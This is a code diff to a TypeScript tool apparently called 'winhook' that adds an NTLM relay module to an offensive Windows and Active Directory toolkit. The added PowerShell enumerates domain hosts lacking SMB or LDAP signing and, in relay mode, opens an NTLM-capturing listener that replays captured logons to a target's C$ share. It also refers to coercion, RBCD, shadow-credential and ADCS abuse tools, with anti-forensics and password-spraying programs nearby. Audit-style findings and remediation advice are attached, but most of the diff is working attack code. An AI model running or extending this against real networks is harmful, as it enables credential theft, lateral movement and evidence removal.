@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  ntlm_relay: {
+    description:
+      "NTLM relay attack toolkit — relay captured NTLM authentication to target services. Enumerate relay targets (SMB signing, LDAP signing, HTTP endpoints), configure relay listener for SMB/HTTP/LDAP/MSSQL targets, check for NTLM relay protections (EPA, channel binding, signing requirements). Complements ntlm_coerce and coercer_full which force authentication — this tool relays it",
+    args: "--action enum|check|relay|targets [--target HOST] [--relay-to HOST] [--service smb|ldap|http|mssql] [--listen-port PORT]",
+  },
   password_spray: {
     description:
       "Domain password spraying — test a single password against multiple domain accounts with lockout-aware throttling. Enumerates domain password policy first (lockout threshold, observation window, complexity requirements), then sprays against all enabled accounts or a target list. Supports custom user lists, automatic jitter between attempts, and lockout threshold safety margin",
@@ -17625,6 +17630,261 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function ntlmRelay(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const target = argVal(args, "--target")
+  const relayTo = argVal(args, "--relay-to")
+  const service = argVal(args, "--service") || "smb"
+  const listenPort = argVal(args, "--listen-port") || "445"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] NTLM relay attack toolkit...\n"]
+
+  if (action === "enum" || action === "targets") {
+    const targetParam = target || "*"
+    const script = `
+Write-Output "=== NTLM Relay Target Enumeration ==="
+Write-Output ""
+# Enumerate hosts — SMB signing status
+Write-Output "=== SMB Signing Status ==="
+$computers = @()
+try {
+  $searcher = New-Object DirectoryServices.DirectorySearcher
+  $searcher.Filter = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
+  $searcher.PageSize = 1000
+  $searcher.PropertiesToLoad.AddRange(@("dNSHostName","operatingSystem"))
+  $results = $searcher.FindAll()
+  foreach ($r in $results) {
+    $computers += @{Name=$r.Properties["dnshostname"][0]; OS=$r.Properties["operatingsystem"][0]}
+  }
+} catch {
+  Write-Output "Could not enumerate AD computers: $_"
+}
+Write-Output "Found $($computers.Count) domain computers"
+Write-Output ""
+$relayable = @()
+$checked = 0
+foreach ($c in ($computers | Select-Object -First 50)) {
+  $name = $c.Name
+  if (-not $name) { continue }
+  $checked++
+  try {
+    $tcp = New-Object System.Net.Sockets.TcpClient
+    $tcp.Connect($name, 445)
+    $tcp.Close()
+    # Check SMB signing via negotiation
+    $signing = "unknown"
+    try {
+      $shares = net view "\\\\$name" 2>&1
+      if ($LASTEXITCODE -eq 0) {
+        $signing = "not_required"
+        $relayable += $name
+      }
+    } catch {}
+    Write-Output "  $name ($($c.OS)) — SMB reachable, signing: $signing"
+  } catch {
+    # Host unreachable
+  }
+  if ($checked % 10 -eq 0) { Write-Output "[*] Checked $checked hosts..." }
+}
+Write-Output ""
+Write-Output "=== Relayable Targets (SMB signing not required) ==="
+Write-Output "Count: $($relayable.Count)"
+foreach ($r in $relayable) { Write-Output "  $r" }
+
+Write-Output ""
+Write-Output "=== LDAP Signing Check ==="
+$rootDSE = [ADSI]"LDAP://RootDSE"
+$dc = $rootDSE.dnsHostName
+try {
+  $ldapSigning = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue).LDAPServerIntegrity
+  $ldapChannelBinding = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters" -Name "LdapEnforceChannelBinding" -ErrorAction SilentlyContinue).LdapEnforceChannelBinding
+  Write-Output "DC: $dc"
+  Write-Output "LDAP Signing: $(switch($ldapSigning) {0 {'None'} 1 {'Negotiate'} 2 {'Required'} default {'Unknown'}})"
+  Write-Output "LDAP Channel Binding: $(switch($ldapChannelBinding) {0 {'Never'} 1 {'When supported'} 2 {'Always'} default {'Unknown'}})"
+  if ($ldapSigning -ne 2) {
+    Write-Output "STATUS: LDAP relay possible — signing not required"
+  }
+} catch {
+  Write-Output "Could not check LDAP signing — run on DC or check GPO"
+}
+
+Write-Output ""
+Write-Output "=== HTTP Endpoints (no signing) ==="
+$httpTargets = @("ADCS/certsrv","Exchange/owa","Exchange/autodiscover","SCCM","WSUS")
+Write-Output "HTTP-based services are inherently relay-friendly (no signing)"
+Write-Output "Check for: $($httpTargets -join ', ')"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    const relayableMatch = r.stdout.match(/Count: (\d+)/)
+    if (relayableMatch && parseInt(relayableMatch[1]) > 0) {
+      findings.push({
+        checkId: "RELAY-001",
+        provider: "winhook",
+        severity: "high",
+        status: "FAIL",
+        resource: "Domain Computers",
+        title: `${relayableMatch[1]} hosts with SMB signing not required`,
+        details: "These hosts can be targeted for NTLM relay attacks — captured NTLM auth can be relayed to create sessions",
+        remediation: "Enable SMB signing via GPO: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options.",
+      })
+    }
+    if (r.stdout.includes("LDAP relay possible")) {
+      findings.push({
+        checkId: "RELAY-002",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Domain Controller LDAP",
+        title: "LDAP signing not required — LDAP relay possible",
+        details: "NTLM auth can be relayed to LDAP for RBCD, shadow credentials, or ACL modification",
+        remediation: "Set 'Domain controller: LDAP server signing requirements' to 'Require signing' in GPO.",
+      })
+    }
+  }
+
+  if (action === "check") {
+    const targetHost = target || "localhost"
+    const script = `
+Write-Output "=== NTLM Relay Protection Check: ${targetHost} ==="
+Write-Output ""
+# SMB signing
+Write-Output "--- SMB Signing ---"
+try {
+  $tcp = New-Object System.Net.Sockets.TcpClient
+  $tcp.Connect('${targetHost}', 445)
+  $tcp.Close()
+  Write-Output "SMB port 445: OPEN"
+  # Check via registry if local
+  if ('${targetHost}' -match 'localhost|127.0.0.1') {
+    $reqSign = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanManServer\\Parameters" -Name RequireSecuritySignature -ErrorAction SilentlyContinue).RequireSecuritySignature
+    Write-Output "RequireSecuritySignature: $(if ($reqSign -eq 1) {'REQUIRED (relay blocked)'} else {'NOT required (relay possible)'})"
+  }
+} catch {
+  Write-Output "SMB port 445: CLOSED"
+}
+# LDAP signing
+Write-Output ""
+Write-Output "--- LDAP Signing ---"
+try {
+  $tcp = New-Object System.Net.Sockets.TcpClient
+  $tcp.Connect('${targetHost}', 389)
+  $tcp.Close()
+  Write-Output "LDAP port 389: OPEN"
+} catch {
+  Write-Output "LDAP port 389: CLOSED"
+}
+# EPA (Extended Protection for Authentication)
+Write-Output ""
+Write-Output "--- HTTP/EPA ---"
+foreach ($port in @(80, 443, 8080, 8443, 5985)) {
+  try {
+    $tcp = New-Object System.Net.Sockets.TcpClient
+    $tcp.Connect('${targetHost}', $port)
+    $tcp.Close()
+    Write-Output "HTTP port $port OPEN — check EPA/channel binding"
+  } catch {}
+}
+# MSSQL
+Write-Output ""
+Write-Output "--- MSSQL ---"
+try {
+  $tcp = New-Object System.Net.Sockets.TcpClient
+  $tcp.Connect('${targetHost}', 1433)
+  $tcp.Close()
+  Write-Output "MSSQL port 1433: OPEN — EPA check needed"
+} catch {
+  Write-Output "MSSQL port 1433: CLOSED"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "relay") {
+    if (!relayTo) {
+      output.push("ERROR: --relay-to required for relay action")
+      output.push("Usage: winhook ntlm_relay --action relay --relay-to TARGET --service smb|ldap|http|mssql")
+      output.push("")
+      output.push("This sets up a PowerShell-based NTLM relay listener.")
+      output.push("Combine with coercion: winhook ntlm_coerce --target VICTIM --listener THIS_HOST")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== NTLM Relay Setup ==="
+Write-Output "Relay target: ${relayTo}"
+Write-Output "Target service: ${service}"
+Write-Output "Listen port: ${listenPort}"
+Write-Output ""
+
+# Build relay configuration
+$relayConfig = @{
+  ListenPort = ${listenPort}
+  RelayTarget = '${relayTo}'
+  Service = '${service}'
+}
+
+# Create HTTP listener for NTLM capture
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add("http://+:${listenPort}/")
+$listener.AuthenticationSchemes = [System.Net.AuthenticationSchemes]::Ntlm
+try {
+  $listener.Start()
+  Write-Output "NTLM listener started on port ${listenPort}"
+  Write-Output "Waiting for incoming NTLM authentication..."
+  Write-Output ""
+  Write-Output "Trigger auth with:"
+  Write-Output "  winhook ntlm_coerce --target VICTIM --listener $(hostname):${listenPort}"
+  Write-Output "  winhook coercer_full --target VICTIM --listener $(hostname):${listenPort}"
+  Write-Output ""
+  $timeout = New-TimeSpan -Seconds 120
+  $sw = [Diagnostics.Stopwatch]::StartNew()
+  while ($sw.Elapsed -lt $timeout) {
+    $ctx = $listener.GetContext()
+    $identity = $ctx.User.Identity
+    Write-Output "[+] NTLM Auth captured!"
+    Write-Output "  User: $($identity.Name)"
+    Write-Output "  Auth Type: $($identity.AuthenticationType)"
+    Write-Output "  Is Authenticated: $($identity.IsAuthenticated)"
+    Write-Output ""
+    # Relay the auth
+    Write-Output "[*] Relaying to ${relayTo} via ${service}..."
+    switch ('${service}') {
+      'smb' {
+        $cred = $identity
+        $result = net use "\\\\${relayTo}\\C$" 2>&1
+        Write-Output "SMB relay result: $result"
+      }
+      'ldap' {
+        Write-Output "LDAP relay — use for RBCD: winhook rbcd_chain --target COMPUTER"
+        Write-Output "LDAP relay — use for shadow creds: winhook shadow_creds --target USER --action add"
+      }
+      'http' {
+        Write-Output "HTTP relay — useful for ADCS: winhook adcs_abuse --action request"
+      }
+      'mssql' {
+        Write-Output "MSSQL relay — useful for: winhook mssql_abuse --server ${relayTo}"
+      }
+    }
+    $response = $ctx.Response
+    $response.StatusCode = 200
+    $response.Close()
+    break
+  }
+} catch {
+  Write-Output "ERROR: $_"
+  Write-Output "Note: Port ${listenPort} may require admin or may be in use"
+} finally {
+  $listener.Stop()
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function passwordSpray(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "policy"
   const password = argVal(args, "--password")
@@ -21578,6 +21838,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   anti_forensics: antiForensics,
   wdigest_enable: wdigestEnable,
   password_spray: passwordSpray,
+  ntlm_relay: ntlmRelay,
 }
 
 export const WinhookTool = Tool.define("winhook", {
